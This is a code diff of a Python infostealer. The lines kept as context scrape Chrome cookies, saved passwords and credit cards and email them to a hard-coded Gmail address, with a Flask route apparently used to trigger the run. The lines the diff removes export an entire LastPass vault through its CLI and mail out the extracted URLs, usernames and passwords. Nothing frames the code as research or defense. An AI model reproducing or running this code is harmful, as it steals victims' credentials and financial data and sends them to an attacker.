@@ -87,30 +87,6 @@ def get_chrome_key():
     # This is just an example; implement your system-specific method to retrieve the encryption key
     return b"your_chrome_encryption_key_here"  # Replace this with actual key retrieval process
 
-# Function to scrape LastPass data using the LastPass CLI
-def scrape_lastpass_data():
-    try:
-        # Use LastPass CLI to export data
-        subprocess.run(["lpass", "login", "cardonewhite081@gmail.com"], check=True)
-        subprocess.run(["lpass", "export", "--all", "--json", "lastpass_export.json"], check=True)
-        
-        # Parse the exported JSON data
-        with open("lastpass_export.json", "r") as file:
-            data = json.load(file)
-        
-        passwords = []
-        for item in data:
-            if "password" in item:
-                passwords.append(f"URL: {item['url']}, Username: {item['login']}, Password: {item['password']}")
-        
-        passwords_data = "\n".join(passwords)  # Join passwords into a string
-        encrypted_data = encrypt_data(passwords_data)
-        
-        with open("lastpass_scraped_data.txt", "w") as file:
-            file.write(encrypted_data)
-    except Exception as e:
-        print(f"Error scraping LastPass: {str(e)}")
-
 # Function to send email with the scraped data
 def send_email(file_path, recipient_email, data):
     sender_email = "cardonewhite081@gmail.com"
@@ -133,19 +109,11 @@ def main():
     # Scrape Chrome data (cookies, passwords, credit cards)
     scrape_chrome_data()
 
-    # Scrape LastPass data (passwords)
-    scrape_lastpass_data()
-
     # Sending email with the decrypted content of the scraped data
     with open("chrome_scraped_data.txt", "r") as file:
         encrypted_data = file.read()
     decrypted_data = decrypt_data(encrypted_data)
     send_email("chrome_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
-
-    with open("lastpass_scraped_data.txt", "r") as file:
-        encrypted_data = file.read()
-    decrypted_data = decrypt_data(encrypted_data)
-    send_email("lastpass_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
 
 # Flask route to run the script
 app = Flask(__name__)
